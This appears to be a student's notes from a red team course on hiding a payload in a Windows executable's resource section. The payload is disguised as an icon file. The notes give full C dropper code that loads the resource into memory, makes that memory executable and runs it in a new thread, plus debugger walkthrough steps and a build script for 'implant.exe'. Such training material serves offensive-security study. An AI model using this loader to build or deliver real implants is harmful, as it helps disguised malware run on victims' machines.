
To store a payload inside a .rsrc section we need:

1) The payload, to generate a file that contains a payload see [[../Payloads|Payloads]] documentation.

2) `resources.h` file that contains:
```C
#define FAVICON_ICO 100
```

3) `resources.rc` file that contians:
```C
#include "resources.h"

FAVICON_ICO RCDATA calc.ico
```

In the code of our dropper we can retrieve the payload 
```C
// 1. find the resource in .rsrc section containing payload 
res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA)

// 2. load the resource from .rsrc section
resHandle = LoadResource(NULL, res)

// 3. get a pointer to the loaded resource
payload = (char *) LockResource(resHandle);

// 4. get the size of the resource/payload
payload_len = SizeofResource(NULL, res)
```

### Key Windows API functions
[**_FindResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea) determines the location of a resource with the specified type and name in the specified module (executable file or DLL). This function can be found in the _kernel32.dll_ library.

[**_LoadResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource) is used to load a resource from the module's resource section. This function can be found in the _kernel32.dll_ library.

[**_LockResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource) is used to obtain a pointer to the data associated with a resource. This function can be found in the _kernel32.dll_ library.

[**_SizeofResource()_**](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource) is used to retrieve the size (in bytes) of a resource. This function can be found in the _kernel32.dll_ library.


Payload Example
```C
/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	// Extract payload from resources section
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char *) LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// Launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
```



Compile the program and execute, attach to the debugger

![[../../../../../../Assest/Pasted image 20251207141838.png]]

```text
payload addr         : 0x00007FF73FDB7060
exec_mem addr        : 0x00000220AD670000
```

as we can see the payload address is `0x00007FF73FDB7060` and .rsrc section is `00007FF73FDB7000`. This means our payload is stored in the `.rsrc` section. The final `60` indicates the offset

Now right click and select ***Follow in Dump***.
![[../../../../../../Assest/Pasted image 20251207142146.png]]
our payload start at `0x00007FF73FDB7060` the same of the output.

now in the Dump 2 window right click and select `Go To > Expression` here paste the address of buffer and click enter

![[../../../../../../Assest/Pasted image 20251207142518.png]]

we can notice that in our buffer we the same payload stored in the .rsrc section.


If now we click enter on the terminal the process close itself and call will be spawn

![[../../../../../../Assest/Pasted image 20251207142707.png]]
## Compiler

In Windows, `rc.exe` and `cvtres.exe` are two command-line tools used in the process of building Windows applications. They are part of the Microsoft Visual Studio toolset.

1. [**_Resource Compiler_**](https://learn.microsoft.com/en-us/windows/win32/menurc/resource-compiler): `rc.exe` is a special resource compiler in Windows. It is used to compile resource script files (with a _.rc_ extension) into binary resource files (with a _.res_ extension). Resource script files contain resources such as icons, bitmaps, dialog boxes, menus, strings, version information, etc., that are used in Windows applications.
    
2. **_Resource Converter_**: `cvtres.exe` is used to convert resource files from an older format (usually _.res_ files) to the newer _.coff_ format (Microsoft's Common Object File). This conversion is necessary for compatibility with modern development tools and linkers. `cvtres.exe` is typically invoked during the build process after resource files are compiled with `rc.exe`.

```bat
@ECHO OFF

rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```